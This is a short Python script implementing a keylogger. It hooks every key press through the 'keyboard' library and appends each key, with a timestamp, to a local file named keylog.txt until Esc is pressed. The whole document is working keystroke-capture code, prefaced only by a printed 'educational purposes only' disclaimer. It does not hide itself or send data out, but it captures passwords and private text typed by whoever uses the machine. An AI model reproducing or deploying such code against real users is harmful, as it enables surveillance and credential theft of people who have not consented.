import keyboard  # For keylogging
import time      # For timestamping
from datetime import datetime

# File to save the logged keystrokes
LOG_FILE = "keylog.txt"

def on_press(event):
    """
    Callback function triggered whenever a key is pressed.
    """
    key = event.name  # Get the key pressed
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Get current timestamp

    # Log the key and timestamp
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] Key pressed: {key}\n")

def start_keylogger():
    """
    Starts the keylogger and logs keystrokes to a file.
    """
    print("Keylogger started. Press 'Esc' to stop.")
    keyboard.on_press(on_press)  # Register the callback function

    # Keep the program running until 'Esc' is pressed
    keyboard.wait("esc")

    print("Keylogger stopped. Logs saved to 'keylog.txt'.")

if __name__ == "__main__":
    # Ethical disclaimer
    print("WARNING: This keylogger is for educational purposes only.")
    print("Do not use it without explicit permission from the user.")
    print("By running this program, you agree to use it responsibly.")

    # Start the keylogger
    start_keylogger()